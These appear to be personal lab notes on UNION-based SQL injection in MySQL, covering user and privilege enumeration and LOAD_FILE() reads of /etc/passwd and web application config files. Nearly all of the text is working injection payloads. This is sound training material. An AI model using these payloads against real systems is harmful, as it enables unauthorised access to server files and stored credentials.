- If we are a privileged user, and have the `FILE` privilege, we can read files.
- database administrator (DBA) privileges are usually allowed to read data

#### Find User:
```sql
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user
```
- Incorporating it in our `UNION` queries:
	- `IN' UNION SELECT 1, user(), 3, 4#`
	- `IN' UNION SELECT 1, user, 3, 4 from mysql.user#`
	- ![](/attachments/Pasted-image-20250625184624.png)
	- This means we are the root user for the DBMS
#### Find User privileges:
```sql
SELECT super_priv FROM mysql.user 
SELECT super_priv FROM mysql.user WHERE user="root"
```
- `IN' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user#`
	- ![](/attachments/Pasted-image-20250625184805.png)
	- Y suggests we have superuser privileges

#### List privileges given to our user:
- `IN' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"# -`
- ![](/attachments/Pasted-image-20250625184956.png)
- We want to use the `FILE` priv

#### LOAD_FILE()
- `IN' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4#`
- ![](/attachments/Pasted-image-20250625185216.png)

- `IN' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4#`
	- this renders the same page in response but the page source now includes the whole file which shows a `config.php` page which is interesting.
- `IN' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4#`
	- ![](/attachments/Pasted-image-20250625185515.png)
